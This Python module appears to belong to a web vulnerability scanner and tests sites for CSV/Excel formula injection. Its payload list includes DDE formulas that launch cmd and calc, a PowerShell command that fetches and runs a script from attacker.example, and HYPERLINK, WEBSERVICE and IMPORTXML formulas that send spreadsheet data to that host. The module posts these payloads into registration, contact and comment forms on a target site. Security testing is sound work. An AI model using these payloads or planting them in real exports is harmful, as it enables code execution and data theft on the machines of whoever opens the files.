"""csv_injection — CSV/Excel formula injection (export/import)"""
from core.http import HttpClient

# formula payloads (will be active if CSV opened in Excel/Sheets)
PAYLOADS = [
    "=cmd|' /C calc'!A0",
    "=cmd|'/C powershell IEX(wget attacker.example/x.ps1)'!A0",
    "=HYPERLINK(\"http://attacker.example?data=\"&A1,\"Click\")",
    "=1+1",
    "=EXEC(\"cmd.exe /c whoami\")",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "+1+1",
    "-1+1",
    "=WEBSERVICE(\"http://attacker.example\")",
    "=IMPORTXML(\"http://attacker.example\",\"//a\")",
]

# export endpoints that produce CSV/XLSX
EXPORT_PATHS = ["/export", "/api/export", "/export.csv", "/api/export.csv",
                "/download", "/api/download", "/report", "/api/report",
                "/api/users/export", "/admin/export", "/data/export",
                "/api/logs/export", "/export/users"]

# form fields that write to CSV
INPUT_PATHS = ["/register", "/signup", "/contact", "/feedback",
               "/api/register", "/api/contact", "/api/feedback",
               "/profile", "/api/profile", "/comment", "/api/comment"]

class CsvInjection:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        findings = []

        # 1. check export endpoints exist
        exports_found = []
        for path in EXPORT_PATHS:
            r = http.get(base + path)
            if r and r.status_code == 200:
                ct = r.headers.get("Content-Type", "").lower()
                if "csv" in ct or "spreadsheet" in ct or "excel" in ct:
                    print(f"[csv] export found: {path} ({ct})")
                    exports_found.append(path)
                    logger.finding("csv_export", "info", path)

        # 2. inject formula into input fields
        for path in INPUT_PATHS:
            r0 = http.get(base + path)
            if not r0 or r0.status_code == 404: continue
            print(f"[csv] input: {path}")

            for payload in PAYLOADS[:3]:
                # try common field names
                for field in ["name", "comment", "message", "email", "title", "feedback"]:
                    r = http.post(base + path, data={field: payload, "email": "test@example.com"})
                    if not r: continue
                    if r.status_code in (200, 201) and payload in r.text:
                        print(f"  [!] reflected: {field}={payload[:30]}")
                        findings.append({"path": path, "field": field,
                                         "payload": payload, "severity": "medium"})

        print(f"[csv] total: {len(findings)} exports={len(exports_found)}")
        return {"findings": findings, "exports": exports_found}
